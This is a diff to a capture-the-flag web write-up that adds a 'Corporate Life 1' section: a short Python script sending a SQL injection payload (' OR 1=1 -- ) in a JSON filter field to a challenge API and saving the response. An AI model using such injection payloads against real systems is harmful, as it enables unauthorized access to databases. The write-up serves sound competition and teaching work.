@@ -1,5 +1,25 @@
 # Web
 
+## Corporate Life 1
+### Payload
+```python
+import httpx
+
+base_url = "http://kashictf.iitbhucybersec.in:65107/api"
+
+payload = {"filter": "' OR 1=1 -- "}
+
+response = httpx.post(base_url + "/list-v2", json=payload)
+
+if response.status_code == 200:
+    with open("output.txt", "w") as file:
+        file.write(response.text)
+    print("Response written to 'output.txt'")
+else:
+    print(f"Request failed with status code: {response.status_code}")
+```
+
+
 ## SuperFastAPI
 
 ### Tìm endpoint
